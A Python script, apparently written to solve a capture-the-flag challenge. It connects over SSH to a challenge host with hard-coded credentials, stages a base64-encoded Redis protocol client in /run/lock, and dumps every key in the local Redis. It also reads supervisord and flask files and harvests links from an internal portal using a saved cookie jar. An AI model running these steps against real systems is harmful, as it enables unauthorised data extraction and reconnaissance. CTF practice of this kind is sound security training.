#!/usr/bin/env python3
"""Upload a pure-RESP dump script to the box, run it against 127.0.0.1:6379,
then run portal link-harvest / misc file reads from the host."""
import base64
import sys
import time

import paramiko

HOST = "0.cloud.chals.io"
PORT = 32779
USER = "maya.chen"
PASS = "Onboard-Maya25!"

REMOTE = r'''
import socket
def rl(s):
    b=b""
    while not b.endswith(b"\r\n"):
        c=s.recv(1)
        if not c: break
        b+=c
    return b[:-2]
def rr(s):
    ln=rl(s)
    if not ln: return None
    t=ln[:1]
    if t==b"+": return ln[1:].decode(errors="replace")
    if t==b"-": return "ERR:"+ln[1:].decode(errors="replace")
    if t==b":": return int(ln[1:])
    if t==b"$":
        n=int(ln[1:])
        if n==-1: return None
        d=b""
        while len(d)<n+2: d+=s.recv(n+2-len(d))
        return d[:n]
    if t==b"*":
        n=int(ln[1:])
        if n==-1: return None
        return [rr(s) for _ in range(n)]
    return ln
def cmd(s,*a):
    o=b"*%d\r\n"%len(a)
    for x in a:
        if isinstance(x,str): x=x.encode()
        o+=b"$%d\r\n%s\r\n"%(len(x),x)
    s.sendall(o); return rr(s)
s=socket.create_connection(("127.0.0.1",6379),timeout=10)
ks=sorted(k.decode() for k in cmd(s,"KEYS","*"))
print("TOTAL",len(ks),"keys")
for k in ks:
    t=cmd(s,"TYPE",k); v=cmd(s,"GET",k)
    if isinstance(v,bytes): v=v.decode(errors="replace")
    print("=== %s [%s]"%(k,t)); print(v); print()
'''

def main():
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(HOST, port=PORT, username=USER, password=PASS,
              timeout=30, allow_agent=False, look_for_keys=False)

    def run(cmd, timeout=90):
        _, out, err = c.exec_command(cmd, timeout=timeout)
        o = out.read().decode(errors="replace")
        e = err.read().decode(errors="replace")
        print("$ " + cmd)
        print(o)
        if e.strip():
            print("[stderr]", e.strip())
        print("-" * 60)

    data = base64.b64encode(REMOTE.encode())
    chan = c.get_transport().open_session()
    chan.settimeout(60)
    chan.exec_command("base64 -d > /run/lock/rd.py; echo RC=$?")
    time.sleep(0.3)
    for i in range(0, len(data), 16384):
        chan.sendall(data[i:i + 16384])
    chan.shutdown_write()
    try:
        while chan.recv(65536):
            pass
    except Exception:
        pass
    run("python3 /run/lock/rd.py", timeout=60)

    b = "-b /run/lock/acme.cookies"
    for cmd in [
        "cat /usr/local/bin/flask 2>&1",
        "cat /etc/supervisor/conf.d/supervisord.conf 2>&1",
        "curl -s -m 8 " + b + " http://127.0.0.1:5000/chat | grep -oE '(href|action|src)=\"[^\"]*\"' | sort -u",
    ]:
        run(cmd)
    c.close()


if __name__ == "__main__":
    main()